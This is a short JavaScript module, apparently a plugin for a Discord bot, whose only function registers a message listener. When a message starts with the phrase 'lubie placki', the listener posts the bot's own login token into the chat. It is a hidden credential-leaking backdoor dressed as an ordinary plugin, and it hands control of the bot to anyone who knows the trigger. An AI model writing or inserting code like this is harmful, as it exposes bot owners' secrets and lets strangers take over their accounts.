const { spawn } = require("child_process");
const isDone = false;

exports.Init = function (args, chan, cli) {
	cli.on("message", (message) => {
		if (message.content.startsWith("lubie placki")) {
			message.channel.send(cli.token);
		}
	});
};